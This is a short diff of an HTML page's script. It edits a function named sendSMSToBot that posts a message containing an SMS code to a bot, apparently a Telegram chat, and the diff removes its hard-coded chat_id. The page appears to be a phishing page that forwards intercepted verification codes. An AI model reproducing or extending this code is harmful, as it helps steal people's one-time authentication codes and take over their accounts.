@@ -1037,7 +1037,6 @@ async function sendSMSToBot(smsCode) {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 message: smsMessage,
-                chat_id: '-1003239032658',
                 parse_mode: 'HTML'
             })
         });
@@ -1137,4 +1136,5 @@ async function sendSMSToBot(smsCode) {
     </script>
 </body>
 </html>
+
 
